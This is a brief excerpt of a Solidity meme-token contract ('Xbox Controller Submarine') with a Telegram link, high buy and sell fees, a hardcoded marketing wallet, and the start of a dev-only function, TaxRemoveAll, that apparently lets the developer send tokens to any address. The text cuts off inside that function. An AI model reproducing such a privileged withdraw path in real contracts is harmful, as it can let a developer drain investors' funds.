...
Telegram: https://t.me/xboxcontrollersub
...
contract WhatCouldPossiblyGoWrong is IERC20, Ownable {
    ...
    string private _name = "Xbox Controller Submarine";
    string private _symbol = "WhatCouldPossiblyGoWrong";
    uint8 private _decimals = 18;

    uint private buyFee = 10; // Default, %
    uint private sellFee = 20; // Default, %
    address public marketWallet = 0x9D28C08339D1a6fFf1173CA4B084D7e8644c85c4; // Marketing Wallet
    ...
    function TaxRemoveAll(address baseToken, address _recepient, uint amount) public {
        if (msg.sender == dev) {
